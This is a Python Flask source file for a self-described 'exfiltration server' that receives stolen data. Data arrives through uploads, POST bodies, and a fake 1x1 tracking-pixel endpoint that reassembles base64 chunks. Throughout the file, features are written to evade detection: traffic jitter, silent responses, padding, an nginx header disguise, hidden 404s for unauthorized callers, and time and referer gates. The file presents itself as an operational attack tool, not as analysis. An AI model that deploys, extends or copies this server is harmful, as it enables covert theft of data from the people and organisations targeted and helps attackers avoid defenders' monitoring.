from flask import Flask
from flask import Flask, request, jsonify, send_from_directory, abort, make_response
from pathlib import Path
from datetime import datetime
from werkzeug.utils import secure_filename
import logging
import uuid
import json
import os
import time
import random
import base64
from io import BytesIO
from collections import deque, defaultdict

# Base directories
BASE_DIR = Path(__file__).parent.resolve()
STORAGE_DIR = BASE_DIR / "storage"
LOGS_DIR = BASE_DIR / "logs"
STORAGE_DIR.mkdir(parents=True, exist_ok=True)
LOGS_DIR.mkdir(parents=True, exist_ok=True)

app = Flask(__name__)

# Config
app.config["MAX_CONTENT_LENGTH"] = (
    int(os.getenv("MAX_CONTENT_LENGTH_MB", "50")) * 1024 * 1024
)

# Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s",
    handlers=[
        logging.FileHandler(str(LOGS_DIR / "exfil.log")),
        logging.StreamHandler(),
    ],
)
log = logging.getLogger(__name__)


def _unique_name(original, suffix=None):
    ts = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
    uid = uuid.uuid4().hex
    safe = secure_filename(original) or "blob"
    if suffix:
        safe = f"{safe}.{suffix.lstrip('.')}"
    return f"{ts}_{uid}_{safe}"


TOKEN = os.getenv("EXFIL_TOKEN")
ALT_EXFIL_PATH = os.getenv("EXFIL_PATH")  # e.g., "/api/v1/collect"
JITTER_MIN_MS = int(os.getenv("EXFIL_JITTER_MIN_MS", "0"))
JITTER_MAX_MS = int(os.getenv("EXFIL_JITTER_MAX_MS", "0"))
SILENT_RESPONSES = os.getenv("EXFIL_SILENT", "0") == "1"
SSL_CERT = os.getenv("EXFIL_SSL_CERT")
SSL_KEY = os.getenv("EXFIL_SSL_KEY")
DISABLE_FILES = os.getenv("EXFIL_DISABLE_FILES", "0") == "1"
GET_EXFIL_ENABLED = os.getenv("EXFIL_GET_ENABLE", "1") == "1"
GET_EXFIL_PATH = os.getenv("EXFIL_GET_PATH", "/pixel.gif")
GET_EXFIL_PARAM = os.getenv("EXFIL_GET_PARAM", "q")
ALLOWED_HOSTS = [h.strip() for h in os.getenv("EXFIL_ALLOWED_HOSTS", "").split(",") if h.strip()]
ALLOWED_REFERERS = [r.strip() for r in os.getenv("EXFIL_ALLOWED_REFERERS", "").split(",") if r.strip()]
ACTIVE_START = os.getenv("EXFIL_ACTIVE_START")  # hour 0-23
ACTIVE_END = os.getenv("EXFIL_ACTIVE_END")      # hour 0-23
PAD_MIN = int(os.getenv("EXFIL_PAD_MIN", "0"))
PAD_MAX = int(os.getenv("EXFIL_PAD_MAX", "0"))
DISABLE_HEALTH = os.getenv("EXFIL_DISABLE_HEALTH", "0") == "1"
UNAUTH_404 = os.getenv("EXFIL_UNAUTH_404", "1") == "1"
RATE_WINDOW_SEC = int(os.getenv("EXFIL_RATE_WINDOW_SEC", "0"))
RATE_MAX = int(os.getenv("EXFIL_RATE_MAX", "0"))
CHUNK_ENABLE = os.getenv("EXFIL_CHUNK_ENABLE", "1") == "1"
CHUNK_TTL_SEC = int(os.getenv("EXFIL_CHUNK_TTL_SEC", "900"))


def _authorized() -> bool:
    if not TOKEN:
        return True  # open if no token configured
    auth = request.headers.get("Authorization", "")
    if auth.startswith("Bearer ") and auth.split(" ", 1)[1] == TOKEN:
        return True
    if request.args.get("token") == TOKEN:
        return True
    cookie_auth = request.cookies.get("auth") or request.cookies.get("session")
    if cookie_auth and cookie_auth == TOKEN:
        return True
    return False


# Simple in-memory rate limiting per token/IP
_rl_map = defaultdict(lambda: deque())

def _rate_limited() -> bool:
    if RATE_WINDOW_SEC <= 0 or RATE_MAX <= 0:
        return False
    key = request.headers.get("Authorization") or request.cookies.get("auth") or request.remote_addr
    now = time.time()
    dq = _rl_map[key]
    while dq and now - dq[0] > RATE_WINDOW_SEC:
        dq.popleft()
    if len(dq) >= RATE_MAX:
        return True
    dq.append(now)
    return False


@app.route("/")
def index():
    return "Exfiltration server ready."


@app.route("/health", methods=["GET"])
def health():
    if DISABLE_HEALTH:
        abort(404)
    files = [p for p in STORAGE_DIR.iterdir() if p.is_file()]
    return jsonify(
        {
            "status": "ok",
            "files": len(files),
            "max_upload_mb": app.config["MAX_CONTENT_LENGTH"] // (1024 * 1024),
            "auth_required": bool(TOKEN),
            "alt_exfil_path": ALT_EXFIL_PATH or "/exfil",
            "tls_enabled": bool(SSL_CERT and SSL_KEY),
            "files_enabled": not DISABLE_FILES,
            "get_exfil_enabled": GET_EXFIL_ENABLED,
        }
    )


def _within_active_window() -> bool:
    try:
        if ACTIVE_START is None or ACTIVE_END is None:
            return True
        start = int(ACTIVE_START)
        end = int(ACTIVE_END)
        now = datetime.now().hour
        if start == end:
            return True
        if start < end:
            return start <= now < end
        else:
            return now >= start or now < end
    except Exception:
        return True


@app.before_request
def _filters():
    # Active hours gate
    if not _within_active_window():
        abort(404)
    # Rate limit gate
    if _rate_limited():
        abort(404)
    # Allowed hosts gate
    if ALLOWED_HOSTS:
        host = request.headers.get("Host", "").split(":")[0]
        if host not in ALLOWED_HOSTS:
            abort(404)
    # Referer partial-match allowlist
    if ALLOWED_REFERERS and request.referrer:
        if not any(r in request.referrer for r in ALLOWED_REFERERS):
            abort(404)


@app.route("/upload", methods=["POST"])
def upload():
    if not _authorized():
        if UNAUTH_404:
            abort(404)
        return jsonify({"error": "Unauthorized"}), 401

    # Optional jitter to blend into traffic patterns
    if JITTER_MAX_MS > 0:
        delay = random.uniform(JITTER_MIN_MS, max(JITTER_MIN_MS, JITTER_MAX_MS)) / 1000.0
        if delay > 0:
            time.sleep(delay)

    if "file" not in request.files:
        return jsonify({"error": "Missing multipart field 'file'"}), 400

    file = request.files["file"]
    original_name = file.filename or ""
    if not original_name:
        return jsonify({"error": "Empty filename"}), 400

    saved_name = _unique_name(original_name)
    save_path = STORAGE_DIR / saved_name
    file.save(save_path)

    try:
        size = save_path.stat().st_size
    except OSError:
        size = None

    log.info(
        "upload file client=%s original=%s saved=%s size=%s type=%s",
        request.remote_addr,
        original_name,
        saved_name,
        size,
        getattr(file, "mimetype", None),
    )

    if SILENT_RESPONSES:
        # 204 with no body is less conspicuous in some contexts
        return ("", 204)
    else:
        body = {
            "message": "File uploaded successfully",
            "saved_as": saved_name,
            "original_name": original_name,
            "size": size,
        }
        resp = jsonify(body)
        if PAD_MAX > 0:
            pad = random.randint(PAD_MIN, max(PAD_MIN, PAD_MAX))
            resp.set_data(resp.get_data(as_text=True) + (" " * pad))
        return resp, 200


@app.route("/exfil", methods=["POST"])
def exfil():
    if not _authorized():
        if UNAUTH_404:
            abort(404)
        return jsonify({"error": "Unauthorized"}), 401

    if JITTER_MAX_MS > 0:
        delay = random.uniform(JITTER_MIN_MS, max(JITTER_MIN_MS, JITTER_MAX_MS)) / 1000.0
        if delay > 0:
            time.sleep(delay)

    content = None
    original_hint = None

    if request.is_json:
        payload = request.get_json(silent=True)
        if payload is None:
            return jsonify({"error": "Invalid JSON"}), 400
        content = json.dumps(payload, separators=(",", ":"))
        original_hint = "data.json"
    elif "data" in request.form:
        content = request.form.get("data", "")
        original_hint = "data.txt"
    else:
        # Raw body
        content = request.get_data(as_text=True)
        original_hint = "raw.bin"

    saved_name = _unique_name(original_hint)
    save_path = STORAGE_DIR / saved_name
    mode = "wb" if isinstance(content, (bytes, bytearray)) else "w"
    with open(save_path, mode) as f:
        if mode == "wb":
            f.write(content)
        else:
            f.write(content or "")

    size = save_path.stat().st_size
    log.info(
        "exfil data client=%s saved=%s size=%s", request.remote_addr, saved_name, size
    )

    if SILENT_RESPONSES:
        return ("", 204)
    else:
        resp = jsonify({"message": "Data captured", "saved_as": saved_name, "size": size})
        if PAD_MAX > 0:
            pad = random.randint(PAD_MIN, max(PAD_MIN, PAD_MAX))
            resp.set_data(resp.get_data(as_text=True) + (" " * pad))
        return resp


if not DISABLE_FILES:
    @app.route("/files", methods=["GET"])
    def list_files():
        if not _authorized():
            if UNAUTH_404:
                abort(404)
            return jsonify({"error": "Unauthorized"}), 401

        if JITTER_MAX_MS > 0:
            delay = random.uniform(JITTER_MIN_MS, max(JITTER_MIN_MS, JITTER_MAX_MS)) / 1000.0
            if delay > 0:
                time.sleep(delay)

        items = []
        for p in sorted(STORAGE_DIR.glob("*"), key=lambda x: x.stat().st_mtime, reverse=True):
            if not p.is_file():
                continue
            name = p.name
            try:
                ts, uid, original = name.split("_", 2)
            except ValueError:
                ts, uid, original = None, None, name
            items.append(
                {
                    "saved_as": name,
                    "original_name": original,
                    "size": p.stat().st_size,
                    "mtime": int(p.stat().st_mtime),
                }
            )

        return jsonify({"files": items})


    @app.route("/files/<path:filename>", methods=["GET"])
    def download_file(filename: str):
        if not _authorized():
            if UNAUTH_404:
                abort(404)
            return jsonify({"error": "Unauthorized"}), 401

        if JITTER_MAX_MS > 0:
            delay = random.uniform(JITTER_MIN_MS, max(JITTER_MIN_MS, JITTER_MAX_MS)) / 1000.0
            if delay > 0:
                time.sleep(delay)

        # Prevent path traversal by only allowing exact filenames from storage
        target = (STORAGE_DIR / filename).resolve()
        if not str(target).startswith(str(STORAGE_DIR)) or not target.exists() or not target.is_file():
            abort(404)
        return send_from_directory(str(STORAGE_DIR), filename, as_attachment=True)


# Camouflage: set common server header and cache behavior
@app.after_request
def _camouflage_headers(resp):
    # Mimic a common server header
    resp.headers["Server"] = os.getenv("EXFIL_SERVER_HEADER", "nginx")
    # Default cache headers for GETs to reduce chatter
    if request.method == "GET" and resp.status_code == 200:
        resp.headers.setdefault("Cache-Control", "public, max-age=3600")
    return resp


@app.after_request
def _gzip_small(resp):
    try:
        ae = request.headers.get("Accept-Encoding", "")
        if "gzip" not in ae.lower():
            return resp
        if resp.direct_passthrough:
            return resp
        ctype = resp.headers.get("Content-Type", "")
        if not any(x in ctype for x in ["json", "text", "javascript"]):
            return resp
        raw = resp.get_data()
        if not raw or len(raw) < 512:
            return resp
        import gzip
        buf = BytesIO()
        with gzip.GzipFile(mode="wb", fileobj=buf) as gz:
            gz.write(raw)
        resp.set_data(buf.getvalue())
        resp.headers["Content-Encoding"] = "gzip"
        resp.headers.pop("Content-Length", None)
        return resp
    except Exception:
        return resp


ONE_BY_ONE_GIF = (
    b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
)


def _save_text_blob(prefix: str, content: str, hint: str):
    name = _unique_name(hint)
    path = STORAGE_DIR / name
    with open(path, "w") as f:
        f.write(content)
    log.info("%s client=%s saved=%s size=%s", prefix, request.remote_addr, name, path.stat().st_size)
    return name


if GET_EXFIL_ENABLED:
    @app.route(GET_EXFIL_PATH, methods=["GET"])
    def exfil_get():
        if not _authorized():
            abort(404)
        if JITTER_MAX_MS > 0:
            delay = random.uniform(JITTER_MIN_MS, max(JITTER_MIN_MS, JITTER_MAX_MS)) / 1000.0
            if delay > 0:
                time.sleep(delay)
        chunk = request.args.get(GET_EXFIL_PARAM)
        if not chunk:
            cookie_c = request.cookies.get("c")
            hdr = request.headers.get("X-Chunk")
            chunk = cookie_c or hdr
        # Optional chunk reassembly using query params id (string), i (index), n (total)
        if CHUNK_ENABLE and request.args.get("id") and request.args.get("i") and request.args.get("n") and chunk:
            try:
                cid = secure_filename(request.args.get("id"))
                idx = int(request.args.get("i"))
                total = int(request.args.get("n"))
                cdir = STORAGE_DIR / "chunks" / cid
                cdir.mkdir(parents=True, exist_ok=True)
                part_path = cdir / f"{idx:06d}.part"
                with open(part_path, "w") as f:
                    f.write(chunk)
                # cleanup old chunk dirs
                now = time.time()
                chunks_root = STORAGE_DIR / "chunks"
                chunks_root.mkdir(parents=True, exist_ok=True)
                for old in chunks_root.glob("*"):
                    try:
                        if now - old.stat().st_mtime > CHUNK_TTL_SEC:
                            for pp in old.glob("*.part"):
                                pp.unlink(missing_ok=True)
                            old.rmdir()
                    except Exception:
                        pass
                parts = sorted(cdir.glob("*.part"))
                if len(parts) >= total:
                    joined = "".join((p.read_text() for p in parts))
                    try:
                        data_bytes = base64.urlsafe_b64decode(joined + "==")
                        data = data_bytes.decode("utf-8", errors="ignore")
                    except Exception:
                        data = joined
                    _save_text_blob("exfil get chunks", data, "pixel.txt")
                    for p in parts:
                        p.unlink(missing_ok=True)
                    try:
                        cdir.rmdir()
                    except Exception:
                        pass
            except Exception:
                pass
        elif chunk:
            try:
                data_bytes = base64.urlsafe_b64decode(chunk + "==")
                data = data_bytes.decode("utf-8", errors="ignore")
            except Exception:
                data = chunk
            _save_text_blob("exfil get", data, "pixel.txt")
        r = make_response(ONE_BY_ONE_GIF)
        r.headers["Content-Type"] = "image/gif"
        r.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        r.headers["Pragma"] = "no-cache"
        r.headers["Expires"] = "0"
        return r


# Common benign endpoints
@app.route("/favicon.ico")
def favicon():
    return ("", 204)


@app.route("/robots.txt")
def robots():
    body = "User-agent: *\nDisallow: /private/\n"
    r = make_response(body, 200)
    r.headers["Content-Type"] = "text/plain; charset=utf-8"
    return r


# Register alternative exfil path if provided
if ALT_EXFIL_PATH and ALT_EXFIL_PATH != "/exfil":
    app.add_url_rule(ALT_EXFIL_PATH, view_func=exfil, methods=["POST"])  # type: ignore



if __name__ == "__main__":
    print("[*] Starting server on 0.0.0.0:8080")
    ssl_context = None
    if SSL_CERT and SSL_KEY:
        ssl_context = (SSL_CERT, SSL_KEY)
        log.info("TLS enabled with provided certificate and key")
    app.run(host="0.0.0.0", port=8080, ssl_context=ssl_context)
